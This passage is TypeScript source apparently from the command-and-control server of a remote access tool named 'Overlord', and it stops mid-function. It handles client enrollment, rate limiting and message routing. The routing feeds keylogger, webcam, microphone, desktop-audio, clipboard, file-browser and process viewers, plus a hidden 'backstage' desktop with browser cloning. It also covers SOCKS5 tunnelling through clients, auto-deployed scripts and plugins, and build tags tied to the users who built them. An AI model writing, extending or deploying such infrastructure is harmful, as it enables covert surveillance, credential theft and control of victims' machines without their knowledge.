import type { ServerWebSocket } from "bun";
import { v4 as uuidv4 } from "uuid";
let _geoip: typeof import("geoip-lite");
async function getGeoip() {
  if (!_geoip) {
    _geoip = (await import("geoip-lite")).default;
  }
  return _geoip;
}
import { logAudit, AuditAction } from "../../auditLog";
import * as clientManager from "../../clientManager";
import { clientExists, setOnlineState, setOfflineStates, upsertClientRow, upsertPendingClientRow, getClientEnrollmentStatus, setClientEnrollmentStatus, lookupClientByPublicKey, getClientPublicKeyById, getClientBuildOwnership, getBuild, getBuildByTag, computeClientSuspiciousFlags, type OfflineStateUpdate } from "../../db";
import { getConfig } from "../../config";
import { logger } from "../../logger";
import { metrics } from "../../metrics";
import { decodeMessage, encodeMessage, type WireMessage, type Hello, type Ping } from "../../protocol";
import { WIRE_PROTOCOL_VERSION } from "../../generated/wire-contract";
import { getNegotiatedCommandVersions } from "../../command-compatibility";
import * as sessionManager from "../../sessions/sessionManager";
import type { SocketData } from "../../sessions/types";
import type { ClientInfo } from "../../types";
import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong, handleScreenshotThumbnailResult, shouldRelayFrameToViewers } from "../../wsHandlers";
import { queueClientDbUpdate, scheduleQueuedClientDbFlush } from "../../client-db-sync";
import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
import { stopAllProxiesForClient } from "../socks5-proxy-manager";
import { verifyBuildToken, isBuildBanned } from "../build-signing";
import { clearThumbnail } from "../../thumbnails";
import { stopRemoteDesktopRecording } from "../rd-recording";
import { requestRemoteDesktopKeyframeAfterScreenshot } from "../ws-console-rd-backstage";
import {
  isAuthenticatedViewerRole,
  registerViewerSocket,
  unregisterViewerSocket,
  validateViewerAuthorization,
} from "../viewer-authorization";

const OFFLINE_GRACE_MS = (() => {
  const raw = process.env.OVERLORD_OFFLINE_GRACE_MS;
  if (raw === undefined || raw === "") return 7_000;
  const n = Number(raw);
  if (!Number.isFinite(n) || n < 0) return 7_000;
  return Math.floor(n);
})();

type ClientLifecyclePayload = {
  id: string;
  host?: string;
  user?: string;
  os?: string;
  ip?: string;
  country?: string;
};

type PendingOffline = {
  dueAt: number;
  payload: ClientLifecyclePayload;
  disconnectReason: string | undefined;
  disconnectDetail: string | undefined;
  deps: WsLifecycleDeps;
};

const pendingOffline = new Map<string, PendingOffline>();
let pendingOfflineFlushTimer: ReturnType<typeof setTimeout> | null = null;
const OFFLINE_BATCH_SIZE = Math.max(
  1,
  Number(process.env.OVERLORD_OFFLINE_BATCH_SIZE || 250),
);
const OFFLINE_BATCH_DELAY_MS = Math.max(
  1,
  Number(process.env.OVERLORD_OFFLINE_BATCH_DELAY_MS || 25),
);

function cancelPendingOffline(clientId: string): boolean {
  const pending = pendingOffline.get(clientId);
  if (!pending) return false;
  pendingOffline.delete(clientId);
  return true;
}

function applyPendingOffline(
  clientId: string,
  pending: PendingOffline,
  offlineUpdates: OfflineStateUpdate[],
): void {
  if (clientManager.hasClient(clientId)) return;
  pending.deps.notifyDashboardClientEvent("client_offline", pending.payload);
  pending.deps.broadcastClientEvent("client_offline", pending.payload);
  pending.deps.notifyRemoteDesktopStatus(clientId, "offline", "Client disconnected");
  offlineUpdates.push({
    id: clientId,
    disconnectReason: pending.disconnectReason,
    disconnectDetail: pending.disconnectDetail,
  });
  pending.deps.notifyDashboard();
}

function schedulePendingOfflineFlush(delayMs: number): void {
  if (pendingOfflineFlushTimer) return;
  pendingOfflineFlushTimer = setTimeout(() => {
    pendingOfflineFlushTimer = null;
    flushPendingOffline();
  }, delayMs);
}

function flushPendingOffline(): void {
  if (pendingOffline.size === 0) return;

  const startedAt = Date.now();
  const now = Date.now();
  let processed = 0;
  let nextDueAt = Number.POSITIVE_INFINITY;
  const offlineUpdates: OfflineStateUpdate[] = [];

  for (const [clientId, pending] of pendingOffline) {
    if (pending.dueAt > now) {
      if (pending.dueAt < nextDueAt) nextDueAt = pending.dueAt;
      continue;
    }

    pendingOffline.delete(clientId);
    applyPendingOffline(clientId, pending, offlineUpdates);
    processed += 1;

    if (processed >= OFFLINE_BATCH_SIZE) {
      break;
    }
  }

  if (offlineUpdates.length > 0) {
    const dbStartedAt = Date.now();
    setOfflineStates(offlineUpdates);
    metrics.recordInternalTask("offline-db-flush", Date.now() - dbStartedAt);
  }
  metrics.recordInternalTask("offline-flush", Date.now() - startedAt);
  if (pendingOffline.size === 0) return;
  if (processed >= OFFLINE_BATCH_SIZE) {
    schedulePendingOfflineFlush(OFFLINE_BATCH_DELAY_MS);
    return;
  }
  if (Number.isFinite(nextDueAt)) {
    schedulePendingOfflineFlush(Math.max(1, nextDueAt - Date.now()));
  }
}

function schedulePendingOffline(
  clientId: string,
  payload: ClientLifecyclePayload,
  disconnectReason: string | undefined,
  disconnectDetail: string | undefined,
  deps: WsLifecycleDeps,
): void {
  cancelPendingOffline(clientId);

  if (OFFLINE_GRACE_MS <= 0) {
    pendingOffline.set(clientId, {
      dueAt: Date.now(),
      payload,
      disconnectReason,
      disconnectDetail,
      deps,
    });
    schedulePendingOfflineFlush(1);
    return;
  }

  pendingOffline.set(clientId, {
    dueAt: Date.now() + OFFLINE_GRACE_MS,
    payload,
    disconnectReason,
    disconnectDetail,
    deps,
  });
  schedulePendingOfflineFlush(OFFLINE_GRACE_MS);
}

type PendingScript = {
  timeout: ReturnType<typeof setTimeout>;
  resolve: (value: { ok?: boolean; result?: string; error?: string }) => void;
  clientId: string;
};

type PendingCommandReply = {
  timeout: ReturnType<typeof setTimeout>;
  resolve: (value: { ok: boolean; message?: string }) => void;
  clientId: string;
};

type WsLifecycleDeps = {
  maxClientPayloadBytes: number;
  maxViewerPayloadBytes: number;
  pendingScripts: Map<string, PendingScript>;
  pendingCommandReplies: Map<string, PendingCommandReply>;
  rdStreamingState: Map<string, unknown>;
  backstageStreamingState: Map<string, unknown>;
  webcamStreamingState: Map<string, unknown>;
  getNotificationConfig: () => { keywords?: string[]; minIntervalMs?: number; clipboardEnabled?: boolean };
  handleDashboardViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleConsoleViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleRemoteDesktopViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleWebcamViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handlebackstageViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleFileBrowserViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleProcessViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleKeyloggerViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleVoiceViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleDesktopAudioViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleNotificationViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleChatViewerOpen: (ws: ServerWebSocket<SocketData>) => void;
  handleChatViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleConsoleViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleRemoteDesktopViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleWebcamViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handlebackstageViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleFileBrowserViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleProcessViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  handleDesktopAudioViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
  dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
  dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
  dispatchAutoLoadPlugins: (info: ClientInfo) => void;
  dispatchKeylogArchiveSync?: (clientId: string, ws: ServerWebSocket<SocketData>) => boolean;
  takePendingNotificationScreenshot: (clientId: string) => any;
  storeNotificationScreenshot: (
    pending: any,
    bytes: Uint8Array,
    format: string,
    width?: number,
    height?: number,
  ) => void;
  handleNotificationScreenshotResult: (clientId: string, payload: any) => void;
  handleConsoleOutput: (clientId: string, payload: any) => void;
  handleDesktopEncoderCapabilities: (clientId: string, payload: any) => void;
  handleDesktopStreamStats: (clientId: string, payload: any) => void;
  handleDesktopCursor: (clientId: string, payload: unknown) => void;
  handleFileBrowserMessage: (clientId: string, payload: any) => void;
  handleProxyTunnelData: (clientId: string, connectionId: string, data: Uint8Array) => void;
  handleProxyTunnelClose: (clientId: string, connectionId: string) => void;
  handleProxyConnectResult: (clientId: string, connectionId: string, ok: boolean) => void;
  handleProcessMessage: (clientId: string, payload: any) => void;
  handleKeyloggerMessage: (clientId: string, payload: any) => void;
  handleKeylogArchiveMessage?: (clientId: string, payload: any, ws?: ServerWebSocket<SocketData>) => void;
  notifyRdInputLatency: (commandId: string) => void;
  handleNotificationScreenshotFailure: (commandId: string | undefined, ok: boolean | undefined, message: string | undefined, clientId?: string) => void;
  handlePluginEvent: (clientId: string, payload: any) => void;
  handleNotification: (clientId: string, payload: any) => void;
  handleVoiceUplink: (clientId: string, payload: any) => void;
  handleDesktopAudioUplink: (clientId: string, payload: any) => void;
  handleWebcamDevices: (clientId: string, payload: any) => void;
  handlebackstageCloneProgress: (clientId: string, payload: any) => void;
  handlebackstageLookupResult: (clientId: string, payload: any) => void;
  handlebackstageBrowserCheckResult: (clientId: string, payload: any) => void;
  handlebackstageInstalledAppsResult: (clientId: string, payload: any) => void;
  handlebackstageDXGIStatus: (clientId: string, payload: any) => void;
  handlebackstageBrowserLaunchStatus: (clientId: string, payload: any) => void;
  handlebackstageWindowListResult: (clientId: string, payload: any) => void;
  handleClipboardContent: (clientId: string, payload: any) => void;
  handleWebrtcP2PAnswer: (clientId: string, payload: any) => void;
  handleWebrtcP2PIce: (clientId: string, payload: any) => void;
  cleanupRdViewerP2P: (ws: ServerWebSocket<SocketData>) => void;
  cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
  cleanupDesktopAudioViewer: (ws: ServerWebSocket<SocketData>) => void;
  stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
  sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
  sendbackstageCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
  notifyConsoleClosed: (clientId: string, reason: string) => void;
  clearPendingNotificationScreenshots: (clientId: string) => void;
  clearClientPluginState: (clientId: string) => void;
  notifyRemoteDesktopStatus: (clientId: string, status: string, reason?: string) => void;
  handleBuildTagConnection: (
    clientId: string,
    buildId: string | null,
    builtByUserId: number | undefined,
    keyFingerprint: string,
  ) => void;
  notifyDashboard: () => void;
  notifyDashboardClientEvent: (
    event: "client_online" | "client_offline" | "client_purgatory",
    info: { id: string; host?: string; user?: string; os?: string; ip?: string; country?: string },
  ) => void;
  broadcastClientEvent: (
    event: "client_online" | "client_offline" | "client_purgatory",
    info: { id: string; host?: string; user?: string; os?: string; ip?: string; country?: string },
  ) => void;
  handleCrashReport: (
    clientId: string,
    crash: { reason: string; detail?: string; host?: string; user?: string; os?: string },
  ) => void;
};

const ENROLLMENT_TIMEOUT_MS = 30_000;
const MAX_PRE_ENROLLMENT_MESSAGE_BYTES = 32 * 1024;

export type EnrollmentAdmissionLimits = {
  maxActiveGlobal: number;
  maxActivePerIp: number;
  maxVerifyingGlobal: number;
  verificationAttemptsPerSecond: number;
  verificationAttemptBurst: number;
};

export type EnrollmentAdmissionDenial =
  | "global_socket_limit"
  | "per_ip_socket_limit"
  | "not_admitted"
  | "already_verifying"
  | "verification_concurrency"
  | "verification_rate";

type EnrollmentAdmissionDecision =
  | { ok: true }
  | { ok: false; reason: EnrollmentAdmissionDenial };

function normalizedAdmissionIp(value: unknown): string {
  if (typeof value !== "string") return "<unknown>";
  const clean = value.trim().slice(0, 128);
  return clean || "<unknown>";
}

function positiveEnrollmentEnv(
  name: string,
  fallback: number,
  min: number,
  max: number,
): number {
  const parsed = Number(process.env[name]);
  if (!Number.isSafeInteger(parsed) || parsed < min) return fallback;
  return Math.min(max, parsed);
}

export function createEnrollmentAdmissionController(rawLimits: EnrollmentAdmissionLimits) {
  const normalizeLimit = (value: number): number =>
    Number.isSafeInteger(value) && value > 0 ? Math.floor(value) : 1;
  const limits: EnrollmentAdmissionLimits = {
    maxActiveGlobal: normalizeLimit(rawLimits.maxActiveGlobal),
    maxActivePerIp: normalizeLimit(rawLimits.maxActivePerIp),
    maxVerifyingGlobal: normalizeLimit(rawLimits.maxVerifyingGlobal),
    verificationAttemptsPerSecond: normalizeLimit(rawLimits.verificationAttemptsPerSecond),
    verificationAttemptBurst: normalizeLimit(rawLimits.verificationAttemptBurst),
  };
  const sockets = new Map<object, { ip: string; verifying: boolean }>();
  const activeByIp = new Map<string, number>();
  let verifying = 0;
  let attemptTokens = limits.verificationAttemptBurst;
  let attemptTokensUpdatedAt = 0;

  function refillAttemptTokens(now: number): void {
    if (attemptTokensUpdatedAt === 0) {
      attemptTokensUpdatedAt = now;
      return;
    }
    const elapsedMs = Math.max(0, Math.min(60_000, now - attemptTokensUpdatedAt));
    attemptTokens = Math.min(
      limits.verificationAttemptBurst,
      attemptTokens + elapsedMs * limits.verificationAttemptsPerSecond / 1_000,
    );
    attemptTokensUpdatedAt = now;
  }

  return {
    admit(socket: object, ipValue: unknown): EnrollmentAdmissionDecision {
      if (sockets.has(socket)) return { ok: true };
      const ip = normalizedAdmissionIp(ipValue);
      if (sockets.size >= limits.maxActiveGlobal) {
        return { ok: false, reason: "global_socket_limit" };
      }
      const ipActive = activeByIp.get(ip) || 0;
      if (ipActive >= limits.maxActivePerIp) {
        return { ok: false, reason: "per_ip_socket_limit" };
      }
      sockets.set(socket, { ip, verifying: false });
      activeByIp.set(ip, ipActive + 1);
      return { ok: true };
    },

    beginVerification(socket: object, now = Date.now()): EnrollmentAdmissionDecision {
      const entry = sockets.get(socket);
      if (!entry) return { ok: false, reason: "not_admitted" };
      if (entry.verifying) return { ok: false, reason: "already_verifying" };
      if (verifying >= limits.maxVerifyingGlobal) {
        return { ok: false, reason: "verification_concurrency" };
      }
      refillAttemptTokens(now);
      if (attemptTokens < 1) {
        return { ok: false, reason: "verification_rate" };
      }
      attemptTokens -= 1;
      entry.verifying = true;
      verifying += 1;
      return { ok: true };
    },

    release(socket: object): boolean {
      const entry = sockets.get(socket);
      if (!entry) return false;
      sockets.delete(socket);
      if (entry.verifying) verifying = Math.max(0, verifying - 1);
      const ipActive = Math.max(0, (activeByIp.get(entry.ip) || 0) - 1);
      if (ipActive === 0) activeByIp.delete(entry.ip);
      else activeByIp.set(entry.ip, ipActive);
      return true;
    },

    stats(ipValue?: unknown) {
      const ip = ipValue === undefined ? undefined : normalizedAdmissionIp(ipValue);
      return {
        active: sockets.size,
        verifying,
        activeForIp: ip === undefined ? undefined : (activeByIp.get(ip) || 0),
        attemptTokens,
      };
    },
  };
}

const enrollmentAdmission = createEnrollmentAdmissionController({
  // These defaults allow a large fleet to reconnect in bursts while bounding
  // attacker-retained challenges and expensive signature/build verification.
  maxActiveGlobal: positiveEnrollmentEnv("OVERLORD_MAX_PREAUTH_SOCKETS_GLOBAL", 100_000, 32, 100_000),
  maxActivePerIp: positiveEnrollmentEnv("OVERLORD_MAX_PREAUTH_SOCKETS_PER_IP", 10_000, 8, 10_000),
  maxVerifyingGlobal: positiveEnrollmentEnv("OVERLORD_MAX_ENROLLMENT_VERIFICATIONS", 4_096, 4, 4_096),
  verificationAttemptsPerSecond: positiveEnrollmentEnv(
    "OVERLORD_ENROLLMENT_VERIFICATION_ATTEMPTS_PER_SECOND",
    100_000,
    8,
    100_000,
  ),
  verificationAttemptBurst: positiveEnrollmentEnv(
    "OVERLORD_ENROLLMENT_VERIFICATION_ATTEMPT_BURST",
    200_000,
    16,
    200_000,
  ),
});

export function getEnrollmentAdmissionStats(ip?: string) {
  return enrollmentAdmission.stats(ip);
}

function clearEnrollmentTimeout(ws: ServerWebSocket<SocketData>) {
  const t = ws.data.enrollmentTimeout;
  if (t) {
    clearTimeout(t);
    ws.data.enrollmentTimeout = undefined;
  }
}

function releaseEnrollmentAdmission(ws: ServerWebSocket<SocketData>): void {
  enrollmentAdmission.release(ws);
}

function rejectEnrollment(ws: ServerWebSocket<SocketData>): void {
  ws.data.enrollmentState = "rejected";
  ws.data.enrollmentNonce = undefined;
  clearEnrollmentTimeout(ws);
  releaseEnrollmentAdmission(ws);
}

const enrollmentAdmissionWarningAt = new Map<EnrollmentAdmissionDenial, number>();

function warnEnrollmentAdmissionDenied(reason: EnrollmentAdmissionDenial): void {
  const now = Date.now();
  const last = enrollmentAdmissionWarningAt.get(reason) || 0;
  if (now - last < 5_000) return;
  enrollmentAdmissionWarningAt.set(reason, now);
  logger.warn(`[purgatory] enrollment admission denied reason=${reason}`);
}

export function decodeCanonicalBase64(value: unknown, expectedBytes: number): Uint8Array<ArrayBuffer> | null {
  if (typeof value !== "string" || value.length === 0 || value.length > 256) return null;
  try {
    const decoded = Buffer.from(value, "base64");
    if (decoded.length !== expectedBytes || decoded.toString("base64") !== value) return null;
    return Uint8Array.from(decoded);
  } catch {
    return null;
  }
}

async function verifyEd25519(publicKeyBase64: string, signatureBase64: string, nonceBase64: string): Promise<boolean> {
  try {
    const pubKeyBytes = decodeCanonicalBase64(publicKeyBase64, 32);
    const sigBytes = decodeCanonicalBase64(signatureBase64, 64);
    const nonceBytes = decodeCanonicalBase64(nonceBase64, 32);
    if (!pubKeyBytes || !sigBytes || !nonceBytes) return false;
    const key = await crypto.subtle.importKey(
      "raw",
      pubKeyBytes,
      { name: "Ed25519" },
      false,
      ["verify"],
    );
    return await crypto.subtle.verify("Ed25519", key, sigBytes, nonceBytes);
  } catch {
    return false;
  }
}

function computeKeyFingerprint(publicKeyBase64: string): string {
  const bytes = Buffer.from(publicKeyBase64, "base64");
  const hash = new Bun.CryptoHasher("sha256").update(bytes).digest("hex");
  return hash;
}

function sanitizeCrashString(value: unknown, maxLen: number): string | undefined {
  if (typeof value !== "string") return undefined;
  const clean = value.slice(0, maxLen).replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "").trim();
  return clean || undefined;
}

export const MAX_DISCONNECT_REASON_LENGTH = 128;
export const MAX_DISCONNECT_DETAIL_LENGTH = 4_096;

export function normalizeDisconnectInfo(payload: unknown): {
  reason: string;
  detail?: string;
} | null {
  if (!payload || typeof payload !== "object") return null;
  const data = payload as Record<string, unknown>;
  const reason = typeof data.reason === "string"
    ? data.reason
        .slice(0, MAX_DISCONNECT_REASON_LENGTH)
        .replace(/[\x00-\x1F\x7F]+/g, " ")
        .replace(/\s+/g, " ")
        .trim()
    : "";
  if (!reason) return null;
  const detail = sanitizeCrashString(data.detail, MAX_DISCONNECT_DETAIL_LENGTH);
  return { reason, ...(detail ? { detail } : {}) };
}

export const MAX_PROXY_TUNNEL_CHUNK_BYTES = 64 * 1024 * 1024;

export function normalizeProxyTunnelChunk(value: unknown): Uint8Array | null {
  let bytes: Uint8Array;
  if (value instanceof Uint8Array) bytes = value;
  else if (value instanceof ArrayBuffer) bytes = new Uint8Array(value);
  else if (ArrayBuffer.isView(value)) {
    bytes = new Uint8Array(value.buffer, value.byteOffset, value.byteLength);
  } else {
    return null;
  }
  return bytes.byteLength > 0 && bytes.byteLength <= MAX_PROXY_TUNNEL_CHUNK_BYTES
    ? bytes
    : null;
}

const CLIENT_INGRESS_BYTE_BURST = 128 * 1024 * 1024;
const CLIENT_INGRESS_BYTES_PER_SECOND = 32 * 1024 * 1024;
const CLIENT_INGRESS_MESSAGE_BURST = 512;
const CLIENT_INGRESS_MESSAGES_PER_SECOND = 256;

export function consumeClientIngressBudget(
  data: SocketData,
  size: number,
  now = Date.now(),
): boolean {
  if (!Number.isFinite(size) || size < 0) return false;
  const previous = Number.isFinite(data.ingressBudgetUpdatedAt)
    ? data.ingressBudgetUpdatedAt!
    : now;
  const elapsedMs = Math.max(0, Math.min(60_000, now - previous));
  const byteTokens = Math.min(
    CLIENT_INGRESS_BYTE_BURST,
    (Number.isFinite(data.ingressByteTokens) ? data.ingressByteTokens! : CLIENT_INGRESS_BYTE_BURST)
      + elapsedMs * CLIENT_INGRESS_BYTES_PER_SECOND / 1000,
  );
  const messageTokens = Math.min(
    CLIENT_INGRESS_MESSAGE_BURST,
    (Number.isFinite(data.ingressMessageTokens) ? data.ingressMessageTokens! : CLIENT_INGRESS_MESSAGE_BURST)
      + elapsedMs * CLIENT_INGRESS_MESSAGES_PER_SECOND / 1000,
  );
  data.ingressBudgetUpdatedAt = now;
  if (size > byteTokens || messageTokens < 1) {
    data.ingressByteTokens = byteTokens;
    data.ingressMessageTokens = messageTokens;
    return false;
  }
  data.ingressByteTokens = byteTokens - size;
  data.ingressMessageTokens = messageTokens - 1;
  return true;
}

export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLifecycleDeps): void {
  const role = ws.data.role as string;
  const clientId = ws.data.clientId;
  const ip = ws.data.ip;
  if (isAuthenticatedViewerRole(ws.data.role) && !registerViewerSocket(ws)) return;
  if (role === "dashboard_viewer") return deps.handleDashboardViewerOpen(ws);
  if (role === "console_viewer") return deps.handleConsoleViewerOpen(ws);
  if (role === "rd_viewer") return deps.handleRemoteDesktopViewerOpen(ws);
  if (role === "webcam_viewer") return deps.handleWebcamViewerOpen(ws);
  if (role === "backstage_viewer") return deps.handlebackstageViewerOpen(ws);
  if (role === "file_browser_viewer") return deps.handleFileBrowserViewerOpen(ws);
  if (role === "process_viewer") return deps.handleProcessViewerOpen(ws);
  if (role === "keylogger_viewer") return deps.handleKeyloggerViewerOpen(ws);
  if (role === "voice_viewer") return deps.handleVoiceViewerOpen(ws);
  if (role === "desktop_audio_viewer") return deps.handleDesktopAudioViewerOpen(ws);
  if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);
  if (role === "chat_viewer") return deps.handleChatViewerOpen(ws);

  const admission = enrollmentAdmission.admit(ws, ip);
  if (!admission.ok) {
    warnEnrollmentAdmissionDenied(admission.reason);
    rejectEnrollment(ws);
    try { ws.close(1013, "Enrollment capacity reached"); } catch {}
    return;
  }

  const id = clientId || uuidv4();
  ws.data.clientId = id;
  ws.data.ip = ip;

  const nonceBytes = new Uint8Array(32);
  crypto.getRandomValues(nonceBytes);
  const nonceBase64 = Buffer.from(nonceBytes).toString("base64");
  ws.data.enrollmentNonce = nonceBase64;
  ws.data.enrollmentState = "challenged";

  try {
    ws.send(encodeMessage({ type: "enrollment_challenge", nonce: nonceBase64 }));
  } catch {
    rejectEnrollment(ws);
    try { ws.close(1011, "Enrollment challenge failed"); } catch {}
    return;
  }

  clearEnrollmentTimeout(ws);
  const timeout = setTimeout(() => {
    ws.data.enrollmentTimeout = undefined;
    rejectEnrollment(ws);
    try {
      ws.close(4002, "enrollment_timeout");
    } catch {}
  }, ENROLLMENT_TIMEOUT_MS);
  ws.data.enrollmentTimeout = timeout;
}

export async function handleWebSocketMessage(
  ws: ServerWebSocket<SocketData>,
  message: string | ArrayBuffer | Uint8Array,
  deps: WsLifecycleDeps,
): Promise<void> {
  const size = getMessageByteLength(message as any);
  const role = ws.data?.role as any;
  const limit = getMaxPayloadLimit(role, deps.maxClientPayloadBytes, deps.maxViewerPayloadBytes);
  if (size > limit) {
    logger.warn(`[ws] closing socket due to oversized message (${size} > ${limit}) role=${role || "unknown"}`);
    if (role === "client" && ws.data.enrollmentState !== "authenticated") {
      rejectEnrollment(ws);
    }
    try {
      ws.close(1009, "Message too large");
    } catch {}
    return;
  }
  const socketRole = ws.data.role as string;
  if (isAuthenticatedViewerRole(ws.data.role) && !validateViewerAuthorization(ws)) return;
  if (socketRole === "console_viewer") return deps.handleConsoleViewerMessage(ws, message);
  if (socketRole === "rd_viewer") return deps.handleRemoteDesktopViewerMessage(ws, message);
  if (socketRole === "webcam_viewer") return deps.handleWebcamViewerMessage(ws, message);
  if (socketRole === "backstage_viewer") return deps.handlebackstageViewerMessage(ws, message);
  if (socketRole === "file_browser_viewer") return deps.handleFileBrowserViewerMessage(ws, message);
  if (socketRole === "process_viewer") return deps.handleProcessViewerMessage(ws, message);
  if (socketRole === "keylogger_viewer") return deps.handleKeyloggerViewerMessage(ws, message);
  if (socketRole === "voice_viewer") return deps.handleVoiceViewerMessage(ws, message);
  if (socketRole === "desktop_audio_viewer") return deps.handleDesktopAudioViewerMessage(ws, message);
  if (socketRole === "notifications_viewer") return;
  if (socketRole === "dashboard_viewer") return;
  if (socketRole === "chat_viewer") return deps.handleChatViewerMessage(ws, message);

  if (
    socketRole === "client"
    && ws.data.enrollmentState !== "authenticated"
    && size > MAX_PRE_ENROLLMENT_MESSAGE_BYTES
  ) {
    logger.warn(
      `[purgatory] closing pre-enrollment socket due to oversized message (${size} > ${MAX_PRE_ENROLLMENT_MESSAGE_BYTES})`,
    );
    rejectEnrollment(ws);
    try { ws.close(1009, "Pre-enrollment message too large"); } catch {}
    return;
  }

  const { clientId, ip } = ws.data;

  let payload: WireMessage;
  try {
    payload = decodeMessage(message as Uint8Array) as WireMessage;
    if (!payload || typeof (payload as any).type !== "string") {
      return;
    }
  } catch (err) {
    logger.error("[message] decode error", err);
    return;
  }

  const payloadType = (payload as any).type as string;

  if (!isAllowedClientMessageType(payloadType)) {
    logger.warn(`[message] Dropping unknown client message type: ${payloadType}`);
    return;
  }

  if (
    socketRole === "client"
    && payloadType !== "hello"
    && ws.data.enrollmentState !== "authenticated"
  ) {
    logger.warn(`[purgatory] rejected ${payloadType} before hello completed for ${clientId}`);
    rejectEnrollment(ws);
    try { ws.close(4002, "hello_required"); } catch {}
    return;
  }

  if (socketRole === "client" && ws.data.enrollmentState === "authenticated") {
    const current = clientManager.getClient(clientId);
    if (!current || current.ws !== ws) {
      logger.warn(`[purgatory] rejected message from superseded socket for ${clientId}`);
      rejectEnrollment(ws);
      try { ws.close(4004, "superseded"); } catch {}
      return;
    }
  }

  const info = clientManager.getClient(clientId);

  if (!info && payloadType !== "hello") return;
  if (info && ws.data.enrollmentState === "authenticated") {
    info.lastSeen = Date.now();
  }

  const client = info!;

  try {
    switch (payloadType) {
      case "hello": {
        const publicKeyInput = typeof (payload as any).publicKey === "string" ? (payload as any).publicKey : "";
        const signatureInput = typeof (payload as any).signature === "string" ? (payload as any).signature : "";
        const nonce = ws.data.enrollmentNonce;

        if (ws.data.enrollmentState !== "challenged" || !nonce) {
          logger.warn(`[purgatory] unexpected second hello for ${clientId}`);
          if (ws.data.enrollmentState !== "authenticated") {
            rejectEnrollment(ws);
          } else {
            ws.data.enrollmentNonce = undefined;
            clearEnrollmentTimeout(ws);
          }
          try { ws.close(4002, "unexpected_hello"); } catch {}
          return;
        }

        // Consume the one-time challenge synchronously, before signature
        // verification yields, so concurrent hello messages cannot replay it.
        ws.data.enrollmentState = "verifying";
        ws.data.enrollmentNonce = undefined;

        const publicKeyBytes = decodeCanonicalBase64(publicKeyInput, 32);
        const signatureBytes = decodeCanonicalBase64(signatureInput, 64);
        if (!publicKeyBytes || !signatureBytes) {
          logger.warn(`[purgatory] missing publicKey/signature/nonce for ${clientId}`);
          rejectEnrollment(ws);
          try { ws.close(4002, "invalid_signature"); } catch {}
          return;
        }
        const publicKey = publicKeyInput;
        const signature = signatureInput;

        const verificationAdmission = enrollmentAdmission.beginVerification(ws);
        if (!verificationAdmission.ok) {
          warnEnrollmentAdmissionDenied(verificationAdmission.reason);
          rejectEnrollment(ws);
          try { ws.close(1013, "Enrollment verification capacity reached"); } catch {}
          return;
        }

        const valid = await verifyEd25519(publicKey, signature, nonce);
        if (ws.data.enrollmentState !== "verifying") return;
        if (!valid) {
          logger.warn(`[purgatory] invalid signature for ${clientId}`);
          rejectEnrollment(ws);
          try { ws.close(4002, "invalid_signature"); } catch {}
          return;
        }

        const keyFingerprint = computeKeyFingerprint(publicKey);

        const existing = lookupClientByPublicKey(publicKey);
        let enrollmentStatus: string;

        if (existing) {
          enrollmentStatus = existing.enrollmentStatus;
          ws.data.clientId = existing.id;
        } else {
          enrollmentStatus = "pending";
          // Client IDs are attacker-controlled at the upgrade URL. Persist a
          // canonical identity derived from the proved key for every fresh
          // enrollment, not only when a claimed ID happens to collide.
          ws.data.clientId = keyFingerprint;
        }

        if (enrollmentStatus !== "approved" && enrollmentStatus !== "denied" && enrollmentStatus !== "pending") {
          logger.warn(`[purgatory] unexpected enrollment_status "${enrollmentStatus}" for ${ws.data.clientId}, treating as pending`);
          enrollmentStatus = "pending";
        }

        let resolvedId = ws.data.clientId;
        const reportedBuildTag = typeof (payload as any).buildTag === "string"
          ? (payload as any).buildTag.trim()
          : "";
        const storedBuildTag = existing
          ? getClientBuildOwnership(existing.id)?.buildTag || ""
          : "";
        const buildTag = storedBuildTag || reportedBuildTag;
        if (storedBuildTag && reportedBuildTag !== storedBuildTag) {
          logger.warn(
            `[build-block] client ${resolvedId} reported a changed or missing build tag; enforcing its enrolled build identity`,
          );
        }

        let resolvedBuildId: string | null = null;
        let builtByUserId: number | undefined;
        let initialClientTag: string | undefined;
        let isRevoked = false;

        if (buildTag) {
          const verified = await verifyBuildToken(buildTag);
